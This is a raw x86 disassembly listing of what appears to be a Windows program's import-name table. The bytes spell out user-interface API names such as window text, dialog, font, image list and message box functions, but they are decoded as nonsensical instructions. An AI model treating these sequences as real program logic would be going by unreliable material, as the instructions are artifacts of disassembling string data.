  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
